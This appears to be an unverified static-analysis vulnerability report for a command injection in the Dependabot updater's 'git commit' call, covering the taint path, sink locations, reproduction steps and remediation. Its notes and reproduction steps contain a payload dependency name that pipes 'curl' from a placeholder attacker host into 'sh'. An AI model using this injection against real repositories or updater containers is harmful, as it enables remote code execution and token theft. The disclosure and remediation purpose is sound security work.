title: Dependabot Updater Command Injection via Dependency Name in Git Commit Message → RCE
summary: An attacker-controlled dependency name (parsed from a manifest key by the Dependabot updater) is interpolated into a double-quoted shell string `git commit -m "#{msg}"` executed via `run_shell_command(..., allow_unsafe_shell_command: true)`, which forwards the string verbatim to `IO.popen`. `Dependency` performs no name validation/sanitization. In grouped-update jobs this yields RCE / arbitrary command execution in the Dependabot updater container. UNVERIFIED STATIC ANALYSIS CANDIDATE — not yet confirmed; requires live reachability verification.
notes: Static analysis only. No live target touched, nothing submitted. Evidence artifacts: c1_rce_report.md and deep_dependabot_analysis.md. Injection example: dependency name `foo" && curl -s <attacker> | sh && "` yields `git commit -m "Updating foo" && curl -s <attacker> | sh && ""` → arbitrary command execution under IO.popen. Sink locations: common/lib/dependabot/workspace/git.rb:133-137 (git commit), git.rb:119-123 (stash), command_helpers.rb:243 (IO.popen), group_update_creation.rb:744 (memo), group_update_creation.rb:76 (stash memo).

details.impact: RCE / arbitrary command execution in the Dependabot updater container (dependabot-core workspace). Attacker gains code execution, file write, and env/token exfiltration in the updater process — strictly more severe than VA-912's read-only arbitrary host file read.
details.evidence: Static dataflow: group_update_creation.rb:744 builds memo `"Updating #{dependency.name}"` via Workspace.store_change; Workspace::Git#commit (git.rb:133-137) interpolates that memo into `git commit -m "#{msg}"` and runs it through run_shell_command with allow_unsafe_shell_command: true, whose raw string is passed verbatim to IO.popen (command_helpers.rb:243). dependency.name is attacker-controlled from a manifest key; Dependency performs no name validation/sanitization. No runtime/live reproduction performed — candidate unverified.
details.entry_point: group_update_creation.rb:744 store_change memo (memo: "Updating #{dependency.name}") in grouped-update updater job
details.taint_path: manifest dependency key → Dependency#name (no sanitization) → group_update_creation.rb:744 `"Updating #{dependency.name}"` → Workspace::Git#commit `git commit -m "#{msg}"` → run_shell_command(allow_unsafe_shell_command: true) → IO.popen
details.guards_evaluated: No name validation/sanitization on Dependency; shell string is double-quoted but metacharacters (" && ; ` $ etc.) break out of quotes; allow_unsafe_shell_command: true disables safe-arg path
details.remediation: 1) Escape/sanitize dependency name before shell interpolation (Shellwords.escape). 2) Avoid shell entirely — use Rugged/git library APIs. 3) Validate Dependency names (reject shell metacharacters). 4) Set allow_unsafe_shell_command: false for git commit/stash calls.
steps_to_reproduce: Configure a Dependabot grouped-update job (groups: in dependabot.yml) for npm/yarn or pip.
Ensure job.clone? is true and DEPENDABOT_REPO_CONTENTS_PATH is set so prepare_workspace activates the git workspace.
Add a malicious dependency name with shell metacharacters (e.g. foo" && curl -s <attacker> | sh && ") to the manifest.
Trigger the grouped update so the dependency is updated (changes.any? true).
Workspace::Git#commit executes git commit -m "Updating <name>" with the unescaped name → command execution under IO.popen.
details.unresolved_prerequisite: Live grouped-update job reachability verification in a real (or faithfully sandboxed) Dependabot updater environment — confirming the injected dependency name reaches git commit's shell string at runtime
details.disproof_stop_condition: A runtime test demonstrates the dependency name is sanitized/escaped before shell interpolation, or the workspace/git path is not reachable for an attacker-controlled dependency name (path disproven).
details.honest_bounds: Static analysis only. Injection mechanics are unambiguous from source, but reachability (grouped updates + workspace config + ecosystem parser passing name verbatim) is not yet proven live. Confidence medium-high. Must not be submitted until live verification.
